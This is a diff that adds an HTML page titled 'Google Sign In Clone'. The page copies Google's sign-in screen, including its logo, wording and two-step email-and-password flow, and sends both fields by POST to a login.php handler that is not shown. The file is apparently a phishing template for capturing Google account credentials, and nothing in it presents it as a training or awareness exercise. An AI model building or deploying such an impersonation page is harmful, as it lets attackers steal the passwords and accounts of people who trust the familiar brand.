@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign In Clone</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" width="75">
+        </div>
+
+        <form id="login-form" action="login.php" method="POST">
+            <div id="email-section">
+                <h2>Sign in</h2>
+                <p>Use your Google Account. The account will be added to this device and available to other Google apps.</p>
+                <p>Learn more about using your account</p>
+                <div class="input-group">
+                    <input type="text" id="email-input" name="email" required>
+                    <label>Email or phone</label>
+                </div>
+                <div class="footer-links">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="button" class="next-btn" onclick="showPassword()">Next</button>
+                </div>
+            </div>
+
+            <div id="password-section" style="display: none;">
+                <h2>Welcome</h2>
+                <div class="user-display">
+                    <span id="display-email"></span>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password-input" name="password" required>
+                    <label>Enter your password</label>
+                </div>
+                <div class="show-password">
+                    <input type="checkbox" id="check" onclick="togglePassword()"> 
+                    <label for="check">Show password</label>
+                </div>
+                <div class="footer-links">
+                    <a href="#" class="create-account">Try another way</a>
+                    <button type="submit" class="next-btn">Next</button>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
